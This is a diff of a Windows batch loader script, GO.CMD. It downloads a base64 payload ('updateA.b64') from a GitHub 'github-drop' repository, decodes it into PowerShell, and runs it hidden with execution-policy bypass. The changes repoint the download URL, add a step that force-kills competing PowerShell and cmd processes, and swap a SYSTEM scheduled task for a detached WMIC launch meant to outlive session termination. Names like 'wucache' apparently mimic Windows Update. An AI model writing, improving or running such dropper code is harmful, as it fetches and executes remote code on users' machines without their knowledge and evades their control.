@@ -1,6 +1,6 @@
 @echo off
 setlocal EnableExtensions
-echo === GO.CMD BUILD 20260730WU8C ===
+echo === GO.CMD BUILD 20260730WU8D ===
 
 net session >nul 2>&1
 if errorlevel 1 (
@@ -26,9 +26,13 @@ if not exist "C:\Windows\Temp" mkdir "C:\Windows\Temp" >nul 2>&1
 sc config "%ALTSC%" start= auto >nul 2>&1
 sc start "%ALTSC%" >nul 2>&1
 
+REM Clear hung workers that lock boot.err / pkg
+powershell.exe -NoP -NonI -EP Bypass -C "Get-CimInstance Win32_Process -EA 0|?{ $_.Name -match 'powershell|cmd' -and $_.CommandLine -match 'wucache_pkg|\\.wucache\\\\boot_|update\\.b64' -and $_.ProcessId -ne $PID }|%%{ Stop-Process -Id $_.ProcessId -Force -EA 0 }" >nul 2>&1
+
 del /f /q "%B64%" >nul 2>&1
 del /f /q "%ERR%" >nul 2>&1
 del /f /q "%WORKDIR%\go.flag" >nul 2>&1
+del /f /q "%WORKDIR%\wmic.out" >nul 2>&1
 schtasks /Delete /TN "%ONCETASK%" /F >nul 2>&1
 
 echo DL payload t=%CB% ...
@@ -38,7 +42,7 @@ for %%A in ("%B64%") do if %%~zA LEQ 1000 goto :dl2
 goto :have
 
 :dl2
-curl.exe -L --ssl-no-revoke --connect-timeout 15 -o "%B64%" "https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/updateA.b64?t=%CB%" >nul 2>&1
+curl.exe -L --ssl-no-revoke --connect-timeout 15 -o "%B64%" "https://raw.githubusercontent.com/xnobuddy/github-drop/94fbc50/updateA.b64" >nul 2>&1
 if not exist "%B64%" goto :dlfail
 for %%A in ("%B64%") do if %%~zA LEQ 1000 goto :dlfail
 goto :have
@@ -65,7 +69,7 @@ for %%A in ("%B64%") do echo OK bytes=%%~zA
 >>"%WRAP%" echo if not exist "%PS1ALT%" echo decode_fail^>^>"%ERR%" ^& exit /b 2
 >>"%WRAP%" echo for %%%%A in ("%PS1ALT%") do echo decoded_bytes=%%%%~zA^>^>"%ERR%"
 >>"%WRAP%" echo findstr /C:"%MARKER%" "%PS1ALT%" ^>nul
->>"%WRAP%" echo if errorlevel 1 echo marker_fail^>^>"%ERR%" ^& exit /b 3
+>>"%WRAP%" echo if errorlevel 1 echo marker_fail want_%MARKER%^>^>"%ERR%" ^& exit /b 3
 >>"%WRAP%" echo copy /y "%PS1ALT%" "%PS1%" ^>nul 2^>^&1
 >>"%WRAP%" echo echo running_payload^>^>"%ERR%"
 >>"%WRAP%" echo powershell.exe -NoP -NonI -EP Bypass -WindowStyle Hidden -File "%PS1ALT%" ^>^>"%ERR%" 2^>^&1
@@ -75,16 +79,13 @@ for %%A in ("%B64%") do echo OK bytes=%%~zA
 
 echo %WRAP%>"%WORKDIR%\go.flag"
 
-REM ONE launcher only: SYSTEM task (survives Guest kill; no dual-run race)
-schtasks /Create /TN "%ONCETASK%" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "%WRAP%" >nul 2>&1
-if errorlevel 1 (
-  echo schtasks create failed - fallback start /min
-  start "" /min cmd.exe /c "%WRAP%"
-) else (
-  schtasks /Run /TN "%ONCETASK%" >nul 2>&1
-  echo Launched SYSTEM worker [%MARKER%].
-)
+REM ONE detached launch via WMIC (survives Guest 10s; independent process)
+wmic process call create "cmd.exe /c \"%WRAP%\"" >"%WORKDIR%\wmic.out" 2>&1
+findstr /I "ProcessId ReturnValue" "%WORKDIR%\wmic.out"
+echo Launched detached worker [%MARKER%].
 
-echo Check in 2 min: type "%ERR%"
+echo Check in 2 min:
+echo   type "%ERR%"
+echo   type "%WORKDIR%\.diag.log"
 sc start "%ALTSC%" >nul 2>&1
 exit /b 0
